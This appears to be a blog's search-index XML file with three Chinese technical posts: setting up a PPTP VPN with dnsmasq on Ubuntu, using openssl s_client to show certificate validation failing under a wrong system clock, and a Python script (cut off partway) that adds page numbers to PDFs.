<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Setup PPTP and DNS server]]></title>
      <url>https://www.litreily.top/2020/12/02/setup-pptp/</url>
      <content type="html"><![CDATA[<p>PPTP (Point to Point Tunneling Protocol) 点对点隧道协议，与PPPoE, L2TP 均属于 PPP(Point to Point Protocol) 点对点协议。这篇来记录下PPTP server的安装和配置过程。</p>
<h2 id="install-DHCP-server"><a href="#install-DHCP-server" class="headerlink" title="install DHCP server"></a>install DHCP server</h2><p>除了PPPoE外，PPTP 与 L2TP 都无法直接给client分配IP，需要使用dhcp server分配。所以在安装PPTP的同时，也要保证DHCP server也已安装。具体方法参考 <a href="https://www.litreily.top/2020/01/17/dhcpd_server/">Setup dhcpd/dhcpdv6 server</a>.</p>
<p>需要注意的是，在Ubuntu 20.10 版本中，网卡的静态IP管理模式与以往有所不同。在以往版本中，是修改 <code>/etc/network/interfaces</code> 文件，但是在最新Ubuntu确不一样，最新版提出了一个叫 <code>netplan</code> 的概念，修改的文件是：</p>
<ul>
<li>/etc/netplan/01-network-manager-all.yaml</li>
</ul>
<p>以 <code>yaml</code> 文件存储配置信息，我们将配置dhcp 对应接口的静态IP为 <code>10.0.0.138/24</code>, 对应配置文件内容如下：</p>
<pre><code class="yaml"># Let NetworkManager manage all devices on this system
network:
   version: 2
   renderer: NetworkManager
   ethernets:
       enp0s8:
           dhcp4: no
           dhcp6: no
           addresses: [10.0.0.138/24]
           gateway4: 10.0.0.138
           nameservers:
               addresses: [10.0.0.138]
</code></pre>
<p>其中 <code>enp0s8</code> 为 interface 名称，从 <code>ifconfig</code> 可以获得。让该配置生效的方式为：</p>
<pre><code class="bash">sudo netplan apply
</code></pre>
<p>重新执行 <code>ifconfig</code> 查看已生效的静态IP.</p>
<h2 id="install-PPTP-server"><a href="#install-PPTP-server" class="headerlink" title="install PPTP server"></a>install PPTP server</h2><p>PPTP Server 的安装其实很简单，就一个指令。</p>
<pre><code class="bash">sudo apt install pptpd
</code></pre>
<p>对 pptpd 的操作与大多数服务一样。</p>
<pre><code class="bash">sudo service pptpd [force-reload|restart|start|status|stop]
</code></pre>
<p>主要是配置稍微复杂些，某些配置与PPPoE, L2TP是共用的，比如密码信息等。</p>
<h3 id="common-config"><a href="#common-config" class="headerlink" title="common config"></a>common config</h3><p>PPPoE, PPTP, L2TP 共用以下文件</p>
<ul>
<li>/etc/ppp/chap-secrets</li>
<li>/etc/ppp/options</li>
</ul>
<p>其中 <code>/etc/ppp/chap-secrets</code> 用于存储密码信息。</p>
<pre><code class="bash"># Secrets for authentication using CHAP
# client        server  secret                  IP addresses
&quot;test123&quot;       *       &quot;123456&quot;                *
</code></pre>
<p>以上 &quot;test123&quot; 为PPTP拨号时的用户名， &quot;123456&quot; 为拨号密码。可以添加多行，代表多个账户。</p>
<p><code>/etc/ppp/options</code>也是共用的，是大部分常用配置的基地。我们通常只需要修改以下部分参数。</p>
<pre><code class="bash"># Require the peer to authenticate itself before allowing network
auth

# Require the peer to authenticate itself using CHAP
+chap

# Send an LCP echo-request frame to the peer every n seconds
lcp-echo-interval 30
# Retry to send LCP echo -request max n times if not receive echo-response
lcp-echo-failure 4

# Disable the IPXCP and IPX protocols
noipx
</code></pre>
<p>以上配置主要是使能密码认证，并启用echo包监听client状态，在无消息响应情况下自动断开连接。</p>
<h3 id="pptpd-config"><a href="#pptpd-config" class="headerlink" title="pptpd config"></a>pptpd config</h3><p>针对pptp server也有对应的特定配置文件，</p>
<ul>
<li>/etc/ppp/pptpd-options</li>
<li>/etc/pptpd.conf</li>
</ul>
<p><code>/etc/ppp/pptpd-options</code> 文件内容较多，但基本不需要修改，只需要添加dns信息即可</p>
<pre><code class="bash">ms-dns 10.0.0.138
</code></pre>
<p><code>/etc/pptpd.conf</code> 文件是配置IP网段的，pptp拨号成功后，会在特定interface (如ppp0) 分配IP，通常是192.168.*网段。</p>
<p>配置该文件时，只需要在文件末尾添加以下信息即可：</p>
<pre><code class="conf">localip 192.168.0.1
remoteip 192.168.0.10-200
</code></pre>
<p><code>localip</code> 代表本地IP，用于与 remote client 通信，<code>remoteip</code> 自然就是需要拨号上网的client对应ip了。</p>
<p>到此就基本配置完成了。</p>
<h2 id="install-DNS-server"><a href="#install-DNS-server" class="headerlink" title="install DNS server"></a>install DNS server</h2><p>想要 PPTP server 完全正常工作，除了dhcp server和以上配置外，还少不了 DNS server 提供 DNS 解析服务。</p>
<p>安装同样很简单，一步到位。</p>
<pre><code class="bash">sudo apt install dnsmasq
</code></pre>
<p>操作与 <code>pptpd</code> 类似，</p>
<pre><code class="bash">sudo service dnsmasq [dump-stats|force-reload|restart|start|status|stop]
</code></pre>
<h3 id="config-dnsmasq"><a href="#config-dnsmasq" class="headerlink" title="config dnsmasq"></a>config dnsmasq</h3><p>dns server 的配置文件主要有：</p>
<ol>
<li>/etc/dnsmasq.conf</li>
<li>/etc/default/dnsmasq</li>
<li>/etc/dnsmasq/dnsmasq.resolv</li>
<li>/etc/dnsmasq/dnsmasq.hosts</li>
</ol>
<p>第 3,4 个是自己手动创建的，也不是必须的，但是创建后更方便管理。</p>
<p>以上配置文件中，<code>/etc/dnsmasq.conf</code>是基础，主要用于指定 <code>resolv</code> 和 <code>hosts</code> 文件, 以及监听地址。</p>
<pre><code class="bash">resolv-file=/etc/dnsmasq/dnsmasq.resolv
listen-address=127.0.0.1, 10.0.0.138
addn-hosts=/etc/dnsmasq/dnsmasq.hosts
</code></pre>
<p><code>/etc/dnsmasq/dnsmasq.resolv</code>用于存储 DNS server IP</p>
<pre><code class="bash">nameserver 127.0.0.1
nameserver 10.0.0.138
</code></pre>
<p><code>/etc/dnsmasq/dnsmasq.hosts</code>用于存储hosts信息，与Windows的hosts是一样的，Ubuntu默认路径是 /etc/hosts.</p>
<pre><code class="bash">10.0.0.138 netgear.com
1.2.3.4 baidu.com
</code></pre>
<h3 id="start-dnsmasq"><a href="#start-dnsmasq" class="headerlink" title="start dnsmasq"></a>start dnsmasq</h3><p>上面讲dns配置好了，使用 <code>sudo service dnsmasq start</code> 可以启动服务。</p>
<p>但是我在这一步出现了问题，提示53端口已经被占用。解决方案如下：</p>
<pre><code class="bash">sudo systemctl stop systemd-resolved.service
sudo systemctl disable systemd-resolved.service
</code></pre>
<h2 id="config-sysctl-conf"><a href="#config-sysctl-conf" class="headerlink" title="config sysctl.conf"></a>config sysctl.conf</h2><p>将<code>ubuntu</code> 系统作为server，还需要开启IP转发功能，所以需要修改以下文件:</p>
<ul>
<li>/etc/sysctl.conf</li>
</ul>
<pre><code class="bash">net.ipv4.ip_forward=1
</code></pre>
<p>然后使用 <code>sudo sysctl -p</code> 使其生效。</p>
<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>总结下，在Ubuntu安装PPTP server，共安装了</p>
<ul>
<li>dhcp server</li>
<li>pptp server</li>
<li>dns server</li>
</ul>
<p>此外，添加了对应的接口信息，静态IP，分配IP网段，启用IP转发功能。不同的操作系统安装可能略有不同，但流程大同小异。</p>
<p>如果在使用多个虚拟网卡的虚拟机中使用，可能还需要添加默认路由。</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li><a href="https://www.cnblogs.com/Yogile/p/12779744.html" target="_blank" rel="noopener">启动或重启 dnsmasq 提示端口 53 被占用的解决方案</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> pptp </tag>
            
            <tag> dns </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[openssl 验证证书有效性]]></title>
      <url>https://www.litreily.top/2020/09/17/openssl/</url>
      <content type="html"><![CDATA[<blockquote>
<p>OpenSSL is a robust, commercial-grade, and full-featured toolkit for the Transport Layer Security (TLS) and Secure Sockets Layer (SSL) protocols. It is also a general-purpose cryptography library.</p>
</blockquote>
<p>openssl是非常强大的TLS/SSL协议相关的工具集，包含丰富的测试工具。 这篇文章来讲讲如何使用openssl工具集中的<code>s_client</code>测试证书认证。</p>
<a id="more"></a>
<pre><code class="bash">$ openssl -h
openssl:Error: &#39;-h&#39; is an invalid command.

Standard commands
asn1parse      ca             ciphers        cms            crl
crl2pkcs7      dgst           dh             dhparam        dsa
dsaparam       ec             ecparam        enc            engine
errstr         gendh          gendsa         genpkey        genrsa
nseq           ocsp           passwd         pkcs12         pkcs7
pkcs8          pkey           pkeyparam      pkeyutl        prime
rand           req            rsa            rsautl         s_client
s_server       s_time         sess_id        smime          speed
spkac          srp            ts             verify         version
x509

Message Digest commands (see the `dgst` command for more details)
md4            md5            rmd160         sha            sha1

Cipher commands (see the `enc` command for more details)
aes-128-cbc    aes-128-ecb    aes-192-cbc    aes-192-ecb    aes-256-cbc
aes-256-ecb    base64         bf             bf-cbc         bf-cfb
bf-ecb         bf-ofb         cast           cast-cbc       cast5-cbc
cast5-cfb      cast5-ecb      cast5-ofb      des            des-cbc
des-cfb        des-ecb        des-ede        des-ede-cbc    des-ede-cfb
des-ede-ofb    des-ede3       des-ede3-cbc   des-ede3-cfb   des-ede3-ofb
des-ofb        des3           desx           rc2            rc2-40-cbc
rc2-64-cbc     rc2-cbc        rc2-cfb        rc2-ecb        rc2-ofb
rc4            rc4-40         seed           seed-cbc       seed-cfb
seed-ecb       seed-ofb       zlib
</code></pre>
<p>以站点<code>devicelocation.ngxcld.com</code>为例，修改当前系统时间，测试不同时间下的认证情况。</p>
<h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>首先使用<code>nslookup</code>获取server ip.</p>
<pre><code class="bash">$ nslookup devicelocation.ngxcld.com
Server:    112.65.184.255
Address 1: 112.65.184.255

Name:      devicelocation.ngxcld.com
Address 1: 54.72.14.214 ec2-54-72-14-214.eu-west-1.compute.amazonaws.com
Address 2: 52.48.74.182 ec2-52-48-74-182.eu-west-1.compute.amazonaws.com
</code></pre>
<p>选择两个地址之一，此处选择<code>52.48.74.182</code>.</p>
<h2 id="openssl-s-client"><a href="#openssl-s-client" class="headerlink" title="openssl s_client"></a>openssl s_client</h2><p><code>s_client</code>使用方法如下，详细参数说明可以通过<code>openssl s_client -h</code> 获得</p>
<pre><code class="bash">openssl s_client -connect serverip:port
</code></pre>
<p>正常情况下，当前系统时间为正确的格林尼治时间，使用<code>openssl s_client</code>进行测试，测试结果如下↓</p>
<pre><code>$ openssl s_client -connect 52.48.74.182:443
CONNECTED(00000003)
depth=4 C = US, O = &quot;Starfield Technologies, Inc.&quot;, OU = Starfield Class 2 Certification Authority
verify return:1
depth=3 C = US, ST = Arizona, L = Scottsdale, O = &quot;Starfield Technologies, Inc.&quot;, CN = Starfield Services Root Certificate Authority - G2
verify return:1
depth=2 C = US, O = Amazon, CN = Amazon Root CA 1
verify return:1
depth=1 C = US, O = Amazon, OU = Server CA 1B, CN = Amazon
verify return:1
depth=0 CN = devicelocation.ngxcld.com
verify return:1
---
Certificate chain
 0 s:/CN=devicelocation.ngxcld.com
   i:/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon
 1 s:/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon
   i:/C=US/O=Amazon/CN=Amazon Root CA 1
 2 s:/C=US/O=Amazon/CN=Amazon Root CA 1
   i:/C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./CN=Starfield Services Root Certificate Authority - G2
 3 s:/C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./CN=Starfield Services Root Certificate Authority - G2
   i:/C=US/O=Starfield Technologies, Inc./OU=Starfield Class 2 Certification Authority
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFezCCBGOgAwIBAgIQD2G5WRjlpBXraGmoG0C50TANBgkqhkiG9w0BAQsFADBG
MQswCQYDVQQGEwJVUzEPMA0GA1UEChMGQW1hem9uMRUwEwYDVQQLEwxTZXJ2ZXIg
Q0EgMUIxDzANBgNVBAMTBkFtYXpvbjAeFw0yMDA4MjgwMDAwMDBaFw0yMTA5Mjcx
MjAwMDBaMCQxIjAgBgNVBAMTGWRldmljZWxvY2F0aW9uLm5neGNsZC5jb20wggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZw+BtpGv+SopXdXVjxvRJb1It
3MqlCXyFp+lRxuM9ySLT0IFCMqhBadzJCIB32VZP4ixQ0WjqGDjwcXVau2ka0SDN
e+xjhYzc6FKzgRmIy016sBQiadasadAZbbcJeRTNrhjD0PqjCE7DbKmQWx8SEoY0
Nm1fnq/TPwBIKqo1vdS2e6CiXcfH5LTBLLE4Ryw9aloWDQ2nud/x8lRMlY+0Gird
X1abENX9++gpoS/TUQ2uXxbFKDPb/Moi/3hirivQiVi1R9CjEYYcmlSr+XctUjk/
VgzqwgUukC15YABvfxCjZRHyNQ85SJ2vDtDhxMfQfhZHqcUozkQPqw28SUVhAgMB
AAGjggKFMIICgTAfBgNVHSMEGDAWgBRZpGYGUqB7lZI8o5QHJ5Z0W/k90DAdBgNV
HQ4EFgQUtbIEC2lD6lx/E0fmPY/OICyl9HQwJAYDVR0RBB0wG4IZZGV2aWNlbG9j
YXRpb24ubmd4Y2xkLmNvbTAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYB
BQUHAwEGCCsGAQUFBwMCMDsGA1UdHwQ0MDIwMKAuoCyGKmh0dHA6Ly9jcmwuc2Nh
MWIuYW1hem9udHJ1c3QuY29tL3NjYTFiLmNybDAgBgNVHSAEGTAXMAsGCWCGSAGG
/WwBAjAIBgZngQwBAgEwdQYIKwYBBQUHAQEEaTBnMC0GCCsGAQUFBzABhiFodHRw
Oi8vb2NzcC5zY2ExYi5hbWF6b250cnVzdC5jb20wNgYIKwYBBQUHMAKGKmh0dHA6
Ly9jcnQuc2NhMWIuYW1hem9udHJ1c3QuY29tL3NjYTFiLmNydDAMBgNVHRMBAf8E
AjAAMIIBBAYKKwYBBAHWeQIEAgSB9QSB8gDwAHYA9lyUL9F3MCIUVBgIMJRWjuNN
Exkzv98MLyALzE7xZOMAAAF0Moj6QwAABAMARzBFAiArdrj+FzgNhO3UOShNAThI
dUxRgP21OgRiZCsOv3UZDwIhAJFyF0BC4kYsJqJFkc+n/ZMmmVrrAG4WPIfGqwq/
nqc+AHYAXNxDkv7mq0VEsV6a1FbmEDf71fpH3KFzlLJe5vbHDsoAAAF0Moj6PQAA
BAMARzBFAiEA+twofyIX7Z2fSqY3OJsHzw2c39o3oBVkwuthnGmsIegCIHNCLMBY
lrkWX0V9j+7Pi+NHe57Bj2+IgWqlw/CHeM5OMA0GCSqGSIb3DQEBCwUAA4IBAQAf
2CtL8DliTB9Inf1+ZKTg6JjCebH4iH61gSfqxJZyDgW+7umFQguL+hEpdDUd6tcq
Uj9ibAxtcdOLSbIjJKwC1cN+gcgSHYbPBD2mQU4U7wPhfFSZRDBoFBH4n13OkgT+
f2tO/byQ7uchJvnezVhjYdJwZoBpPi6IXpzqE5A6IH9AJz0iQJLUyyC1b8fQNiFQ
5j65t5FrLqf9LU82hrDrPLjEvR9v6BAumlH/0FmaIbXPwZm6kMXmTqRoPzX0+R5W
M8bUGEDnkWMwzj+1eW64hpu8Fwsq17SAeITVclj2ZNjz2LaNyuLbdKkMatnLq1M6
2sq4dgrQ1Jx90PGLzAbi
-----END CERTIFICATE-----
subject=/CN=devicelocation.ngxcld.com
issuer=/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon
---
No client certificate CA names sent
Peer signing digest: SHA512
Server Temp Key: ECDH, P-256, 256 bits
---
SSL handshake has read 5506 bytes and written 400 bytes
---
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES128-GCM-SHA256
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES128-GCM-SHA256
    Session-ID: EFA5500D91F4403CA0D2003B98F790B238F68D34E4A9D1F7CB6E382B1C762588
    Session-ID-ctx:
    Master-Key: 8CEE4FCFC53AA6CB66F915D5C0911D28F59D30477EEDDA1E2A5E6C0DEE3FE24F8CC7918EF85717D34BC675F83F1BB892
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 43200 (seconds)
    TLS session ticket:
    0000 - c3 33 dc 6e 4b 4c 35 4f-3a 84 49 5d 7f 4a 12 30   .3.nKL5O:.I].J.0
    0010 - cb be 29 f6 6c 04 78 61-19 48 9a ba e8 b8 21 31   ..).l.xa.H....!1
    0020 - 56 52 ab d0 16 eb 56 6f-b6 8c 00 42 f6 14 cd 49   VR....Vo...B...I
    0030 - b4 a1 09 5b 0e ea 11 1c-0c 85 61 4d 9b b3 75 49   ...[......aM..uI
    0040 - 80 d5 ab da c8 2d 07 4c-c0 dc 9a dc 9c 4d 66 87   .....-.L.....Mf.
    0050 - b3 8c 72 f4 c3 75 9a cf-76 46 75 35 81 54 48 ad   ..r..u..vFu5.TH.
    0060 - 71 16 db 55 12 61 fe da-87 1a bc eb 43 83 2d 75   q..U.a......C.-u
    0070 - 6a 6d 97 4a de 09 e1 b2-5c 18 2e af ac a0 a1 7a   jm.J....\......z
    0080 - b8 e9 3f 83 65 5e 3e da-db 4f 1d fd 94 b6 66 e1   ..?.e^&gt;..O....f.
    0090 - 74 73 3b 09 93 83 2f 23-7f 13 98 8c 63 3b 13 6b   ts;.../#....c;.k
    00a0 - 03 07 0f d2 b2 66 37 df-92 e7 c9 c1 7b da 26 67   .....f7.....{.&amp;g

    Start Time: 1600248002
    Timeout   : 300 (sec)
    Verify return code: 0 (ok)
---
</code></pre><p>输出结果中包含server端的证书以及认证结果，Verify return code 为0(ok)，说明一切正常。</p>
<p>现在我故意将系统时间调整为去年的时间</p>
<pre><code class="bash">date -s 2019-09-14
</code></pre>
<p>重新执行一遍指令，结果如下↓</p>
<pre><code class="bash">$ openssl s_client -connect 52.48.74.182:443
CONNECTED(00000003)
depth=4 C = US, O = &quot;Starfield Technologies, Inc.&quot;, OU = Starfield Class 2 Certification Authority
verify return:1
depth=3 C = US, ST = Arizona, L = Scottsdale, O = &quot;Starfield Technologies, Inc.&quot;, CN = Starfield Services Root Certificate Authority - G2
verify return:1
depth=2 C = US, O = Amazon, CN = Amazon Root CA 1
verify return:1
depth=1 C = US, O = Amazon, OU = Server CA 1B, CN = Amazon
verify return:1
depth=0 CN = devicelocation.ngxcld.com
verify error:num=9:certificate is not yet valid
notBefore=Aug 28 00:00:00 2020 GMT
verify return:1
depth=0 CN = devicelocation.ngxcld.com
notBefore=Aug 28 00:00:00 2020 GMT
verify return:1
---
Certificate chain
 0 s:/CN=devicelocation.ngxcld.com
   i:/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon
 1 s:/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon
   i:/C=US/O=Amazon/CN=Amazon Root CA 1
 2 s:/C=US/O=Amazon/CN=Amazon Root CA 1
   i:/C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./CN=Starfield Services Root Certificate Authority - G2
 3 s:/C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./CN=Starfield Services Root Certificate Authority - G2
   i:/C=US/O=Starfield Technologies, Inc./OU=Starfield Class 2 Certification Authority
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFezCCBGOgAwIBAgIQD2G5WRjlpBXraGmoG0C50TANBgkqhkiG9w0BAQsFADBG
MQswCQYDVQQGEwJVUzEPMA0GA1UEChMGQW1hem9uMRUwEwYDVQQLEwxTZXJ2ZXIg
Q0EgMUIxDzANBgNVBAMTBkFtYXpvbjAeFw0yMDA4MjgwMDAwMDBaFw0yMTA5Mjcx
MjAwMDBaMCQxIjAgBgNVBAMTGWRldmljZWxvY2F0aW9uLm5neGNsZC5jb20wggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZw+BtpGv+SopXdXVjxvRJb1It
3MqlCXyFp+lRxuM9ySLT0IFCMqhBadzJCIB32VZP4ixQ0WjqGDjwcXVau2ka0SDN
e+xjhYzc6FKzgRmIy016sBQiadasadAZbbcJeRTNrhjD0PqjCE7DbKmQWx8SEoY0
Nm1fnq/TPwBIKqo1vdS2e6CiXcfH5LTBLLE4Ryw9aloWDQ2nud/x8lRMlY+0Gird
X1abENX9++gpoS/TUQ2uXxbFKDPb/Moi/3hirivQiVi1R9CjEYYcmlSr+XctUjk/
VgzqwgUukC15YABvfxCjZRHyNQ85SJ2vDtDhxMfQfhZHqcUozkQPqw28SUVhAgMB
AAGjggKFMIICgTAfBgNVHSMEGDAWgBRZpGYGUqB7lZI8o5QHJ5Z0W/k90DAdBgNV
HQ4EFgQUtbIEC2lD6lx/E0fmPY/OICyl9HQwJAYDVR0RBB0wG4IZZGV2aWNlbG9j
YXRpb24ubmd4Y2xkLmNvbTAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYB
BQUHAwEGCCsGAQUFBwMCMDsGA1UdHwQ0MDIwMKAuoCyGKmh0dHA6Ly9jcmwuc2Nh
MWIuYW1hem9udHJ1c3QuY29tL3NjYTFiLmNybDAgBgNVHSAEGTAXMAsGCWCGSAGG
/WwBAjAIBgZngQwBAgEwdQYIKwYBBQUHAQEEaTBnMC0GCCsGAQUFBzABhiFodHRw
Oi8vb2NzcC5zY2ExYi5hbWF6b250cnVzdC5jb20wNgYIKwYBBQUHMAKGKmh0dHA6
Ly9jcnQuc2NhMWIuYW1hem9udHJ1c3QuY29tL3NjYTFiLmNydDAMBgNVHRMBAf8E
AjAAMIIBBAYKKwYBBAHWeQIEAgSB9QSB8gDwAHYA9lyUL9F3MCIUVBgIMJRWjuNN
Exkzv98MLyALzE7xZOMAAAF0Moj6QwAABAMARzBFAiArdrj+FzgNhO3UOShNAThI
dUxRgP21OgRiZCsOv3UZDwIhAJFyF0BC4kYsJqJFkc+n/ZMmmVrrAG4WPIfGqwq/
nqc+AHYAXNxDkv7mq0VEsV6a1FbmEDf71fpH3KFzlLJe5vbHDsoAAAF0Moj6PQAA
BAMARzBFAiEA+twofyIX7Z2fSqY3OJsHzw2c39o3oBVkwuthnGmsIegCIHNCLMBY
lrkWX0V9j+7Pi+NHe57Bj2+IgWqlw/CHeM5OMA0GCSqGSIb3DQEBCwUAA4IBAQAf
2CtL8DliTB9Inf1+ZKTg6JjCebH4iH61gSfqxJZyDgW+7umFQguL+hEpdDUd6tcq
Uj9ibAxtcdOLSbIjJKwC1cN+gcgSHYbPBD2mQU4U7wPhfFSZRDBoFBH4n13OkgT+
f2tO/byQ7uchJvnezVhjYdJwZoBpPi6IXpzqE5A6IH9AJz0iQJLUyyC1b8fQNiFQ
5j65t5FrLqf9LU82hrDrPLjEvR9v6BAumlH/0FmaIbXPwZm6kMXmTqRoPzX0+R5W
M8bUGEDnkWMwzj+1eW64hpu8Fwsq17SAeITVclj2ZNjz2LaNyuLbdKkMatnLq1M6
2sq4dgrQ1Jx90PGLzAbi
-----END CERTIFICATE-----
subject=/CN=devicelocation.ngxcld.com
issuer=/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon
---
No client certificate CA names sent
Peer signing digest: SHA512
Server Temp Key: ECDH, P-256, 256 bits
---
SSL handshake has read 5506 bytes and written 400 bytes
---
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES128-GCM-SHA256
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES128-GCM-SHA256
    Session-ID: 979E3C71B293EDF1923989B706B0B315A638046A30DA9E6B77C8889DF94BC613
    Session-ID-ctx:
    Master-Key: 24F7FD66C5A195765C62FE5B8D5304F94F3006A1A2993B7C3FB5B1D9162A9E5BFD6CADC984458153E32F012AD30A3F7A
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 43200 (seconds)
    TLS session ticket:
    0000 - c3 33 dc 6e 4b 4c 35 4f-3a 84 49 5d 7f 4a 12 30   .3.nKL5O:.I].J.0
    0010 - be c3 28 c9 3a fd 73 6a-c7 65 65 b0 a7 69 a1 ca   ..(.:.sj.ee..i..
    0020 - f8 89 1d 62 75 3d 46 7d-92 62 01 f6 8b fa 40 c7   ...bu=F}.b....@.
    0030 - ef de 3b 35 50 ab 0c 45-79 ce 97 2f 13 9e 0c 10   ..;5P..Ey../....
    0040 - 4c d2 2a 4e 85 fc 8f b1-4c c9 98 1a 0d 39 a9 26   L.*N....L....9.&amp;
    0050 - e3 c3 18 16 fc ad b9 9a-ba 5d f7 b1 db 70 ab 30   .........]...p.0
    0060 - 04 b3 9a 2f 66 97 74 e6-74 c9 04 59 3b 18 df 67   .../f.t.t..Y;..g
    0070 - a3 17 03 52 c8 c9 b9 8c-1f 11 01 8e cf bc 17 22   ...R...........&quot;
    0080 - e7 7d 40 ad 53 c6 04 83-d2 80 24 28 3f cb f8 c6   .}@.S.....$(?...
    0090 - c4 1c 2f 42 15 7b a3 13-c7 4f 8f 62 18 71 0f 2a   ../B.{...O.b.q.*
    00a0 - 90 8b 8b d9 64 b8 1e 0d-cf df 62 cc fc 95 d0 ce   ....d.....b.....

    Start Time: 1598327363
    Timeout   : 300 (sec)
    Verify return code: 9 (certificate is not yet valid)
---
</code></pre>
<p>可以看到最后的<code>Verify return code</code>变为9了，而且提示<code>certificate is not yet vaild</code>, 说明证书无效，实际上不是证书无效，而是本地系统时间没有同步，然后认为server端的证书有效期太超前，错认为是证书无效。在前半部分的错误信息中</p>
<pre><code class="bash">verify error:num=9:certificate is not yet valid
notBefore=Aug 28 00:00:00 2020 GMT
</code></pre>
<p>可以看出server端证书的起始时间是<code>Aug 28 00:00:00 2020 GMT</code>，所以只要当前系统时间在这个时间之后就是正常的。</p>
<p>在出错的情况下使用<code>wireshark</code>抓包就可以发现，client端认为证书无效，会alert一个<code>Bad Certificate</code>的错误信息，然后关闭当前连接。</p>
<p><img src="/assets/network/ssl/bad-certificate.png" alt="wireshark Bad Certificate"></p>
<p>在嵌入式设备中，如果NTP没有同步，当前系统时间就有可能是错误的，此时使用<code>https</code>与远程服务器通信就可能出错。</p>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
            <category> Security </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openssl </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python之给pdf添加页码]]></title>
      <url>https://www.litreily.top/2020/08/13/python-pdf/</url>
      <content type="html"><![CDATA[<p>最近写release note, 总感觉用<code>tex</code>不太方便，特别是装<code>texlive</code>占用大量空间，还有各种依赖问题，想着能不能用<code>markdown</code>写更方便。实践证明，<a href="https://typora.io/" target="_blank" rel="noopener">typora</a>导出pdf的功能真的很棒，唯独一个不足之处就是生成的PDF不带<strong>页码</strong>。</p>
<p>这个虽然可以使用在线工具实现，或者使用Adobe、福昕的 pdf 编辑功能，但是很多情况，尤其是工作平台是不方便使用的。为此我想到了<code>Python</code>，通过脚本把页码加上。</p>
<h2 id="安装Python库"><a href="#安装Python库" class="headerlink" title="安装Python库"></a>安装Python库</h2><p>首先需要安装两个依赖库，<code>PyPDF2</code>以及<code>reportLab</code>, <code>PyPDF2</code>可以对PDF进行拆分、合并、删除、加密等操作；<code>reportlab</code>则更是强大，看看下面的官方介绍。</p>
<blockquote>
<p>We build solutions to generate rich, attractive and fully bespoke PDFs at incredible speeds.<br>Over 5 million documents are generated each month using Reportlab&#39;s software<br>--- <a href="https://www.reportlab.com/" target="_blank" rel="noopener">https://www.reportlab.com/</a></p>
</blockquote>
<pre><code class="py">sudo pip3 install pypdf2
sudo pip3 install reportlab
</code></pre>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>添加页码思路如下：</p>
<ol>
<li>使用<code>PyPDF2</code>打开待添加页码的PDF, 记录总页数</li>
<li>使用<code>reportlab</code>创建只带有页码的临时PDF，页面数量与待修改文件一致</li>
<li>将临时PDF和待修改PDF合并在一起</li>
<li>保存合并以后的PDF文件</li>
</ol>
<p>具体实现如下：</p>
<h3 id="创建临时PDF"><a href="#创建临时PDF" class="headerlink" title="创建临时PDF"></a>创建临时PDF</h3><p>使用<code>reportlab</code>创建PDF，每个页面对应一个画布<code>canvas</code>，创建页面的过程就像是在画布上画画，把页码画在指定的位置，A4纸张210mm*297mm，以画布左下角为原点，那么页码的坐标大概是 (210/2-1, 4) = (104, 4), 单位mm</p>
<p>下面的函数就是在已知总页面数的情况下逐页绘制页码，然后保存至tmp文件中。</p>
<pre><code class="py">from reportlab.lib.units import mm
from reportlab.pdfgen import canvas
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont


def create_pdf_with_pagenumber(tmp, num):
    &#39;&#39;&#39;create tmp pdf that only include page number&#39;&#39;&#39;
    pdfmetrics.registerFont(
        TTFont(&#39;Times-New-Roman&#39;, &#39;C:\\Windows\\Fonts\\times.ttf&#39;))
    c = canvas.Canvas(tmp)
    for i in range(num):
        c.setFont(&#39;Times-New-Roman&#39;, 10)
        c.drawString((104)*mm, (4)*mm, str(i + 1))
        c.showPage()
    c.save()
</code></pre>
<h3 id="合并PDF"><a href="#合并PDF" class="headerlink" title="合并PDF"></a>合并PDF</h3><p>合并PDF主要用到的是<code>PyPDF2</code>的PdfFileWriter, PdfFileReader, 一个写，一个读。合并过程很简单，打开文件，逐页读取(getPage)，使用mergePage合并两个PDF的对应页面，然后将合并后的页面写入(addPage)到输出文件中。</p>
<pre><code class="py">from PyPDF2 import PdfFileWriter, PdfFileReader

